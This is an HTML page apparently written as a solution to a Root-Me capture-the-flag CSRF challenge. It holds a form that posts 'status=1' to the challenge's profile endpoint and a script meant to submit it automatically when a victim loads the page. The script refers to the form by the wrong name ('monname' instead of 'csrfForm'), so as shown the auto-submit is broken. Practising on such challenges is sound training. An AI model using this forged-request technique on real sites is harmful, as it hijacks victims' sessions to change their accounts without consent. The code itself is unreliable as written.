<!DOCTYPE html>
<html>
<head>
    <title>CSRF Challenge</title>
</head>
<body>
   <form name="csrfForm" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST">
       <input type="text" name="username" value="test" />
       <input type="text" name="status" value="1" />
   </form>
   <script>
       function submitFormAutomatically() {
           var form = document.monname;
           if (form) {
               form.submit();
           }
       }
       submitFormAutomatically();
   </script>
</body>
</html>
